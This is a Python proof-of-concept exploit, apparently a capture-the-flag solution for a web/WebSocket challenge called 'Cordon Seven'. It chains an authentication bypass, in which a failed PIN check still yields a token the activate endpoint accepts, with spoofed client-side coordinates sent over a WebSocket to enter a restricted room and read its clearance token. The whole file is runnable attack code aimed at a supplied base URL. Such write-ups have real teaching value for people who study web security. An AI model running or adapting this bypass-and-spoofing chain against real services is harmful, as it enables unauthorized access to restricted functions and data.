#!/usr/bin/env python3
"""
Vicinity Wire - Cordon Seven (CSCTF 2026, Web / WebSocket)

Chains two design flaws: (1) /api/station/pin-check returns an activation-grade
`attempt` token even on a PIN mismatch, and /api/station/activate accepts it
without a server-side success check; (2) the position channel trusts
client-supplied coordinates, so reporting the cordon centre marks the station
`inside` and unlocks the restricted `cordon-seven` room. Joining the room
returns a room.snapshot whose clearance_token is the flag.

Requires the `websocket-client` package (as in the writeup).

Usage: python3 inside_the_cordon.py <base_url>

The CTF instance is retired; this PoC documents the exploit path.
"""
import sys
import json
import time
import http.client
import urllib.parse

import websocket  # websocket-client

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://<instance>"
_p = urllib.parse.urlparse(BASE)
HOST = _p.hostname or "<instance>"
PORT = _p.port or (443 if _p.scheme == "https" else 80)
USE_TLS = _p.scheme == "https"

# Cordon geometry disclosed by /api/station/activate (radius 75 m).
LATITUDE, LONGITUDE = -47.203945, -126.300000
ROOM = "cordon-seven"


def http_request(method: str, path: str, cookie: str, body: dict = None) -> tuple:
    conn_cls = http.client.HTTPSConnection if USE_TLS else http.client.HTTPConnection
    conn = conn_cls(HOST, PORT, timeout=15)
    headers = {"Cookie": f"station={cookie}" if cookie else ""}
    data = None
    if body is not None:
        data = json.dumps(body)
        headers["Content-Type"] = "application/json"
    conn.request(method, path, body=data, headers=headers)
    resp = conn.getresponse()
    raw = resp.read().decode("utf-8", errors="replace")
    set_cookie = resp.getheader("Set-Cookie") or ""
    conn.close()
    return resp.status, raw, set_cookie


def main() -> None:
    # Step 1: create a station session (GET / sets the HttpOnly cookie).
    conn_cls = http.client.HTTPSConnection if USE_TLS else http.client.HTTPConnection
    conn = conn_cls(HOST, PORT, timeout=15)
    conn.request("GET", "/")
    resp = conn.getresponse()
    resp.read()
    set_cookie = resp.getheader("Set-Cookie") or ""
    conn.close()
    cookie = set_cookie.split("station=", 1)[1].split(";", 1)[0]
    print("[*] station session cookie acquired")

    # Step 2: submit a wrong PIN; the PIN_MISMATCH response still carries an
    # activation-grade `attempt` token.
    status, body, _ = http_request("POST", "/api/station/pin-check", cookie,
                                   {"pin": "000000"})
    pin = json.loads(body)
    print(f"[*] pin-check: {body}")
    attempt = pin["attempt"]

    # Step 3: activate with the failed attempt (the client-side gate is skipped).
    status, body, _ = http_request("POST", "/api/station/activate", cookie,
                                   {"attempt": attempt})
    act = json.loads(body)
    print(f"[*] activate: {body}")
    cap = act["cap"]

    # Step 4: authenticate to /ws and report the cordon centre.
    ws_scheme = "wss" if USE_TLS else "ws"
    ws = websocket.create_connection(
        f"{ws_scheme}://{HOST}:{PORT}/ws",
        header=[f"Cookie: station={cookie}"], timeout=15)

    def send(obj):
        ws.send(json.dumps(obj))

    def recv():
        return json.loads(ws.recv())

    send({"type": "station.authenticate", "sequence": 1, "cap": cap})
    r = recv()
    seq = r["next_sequence"]

    send({"type": "position.update", "sequence": seq,
          "observed_at_ms": int(time.time() * 1000),
          "latitude": LATITUDE, "longitude": LONGITUDE, "accuracy_m": 5.0})
    r = recv()
    print(f"[*] position.update: {r}")
    seq = r["next_sequence"]

    # Step 5: join the restricted room; the snapshot carries clearance_token.
    send({"type": "room.join", "sequence": seq, "room": ROOM})
    r = recv()
    print(f"[*] room.snapshot: {r}")
    ws.close()


if __name__ == "__main__":
    main()
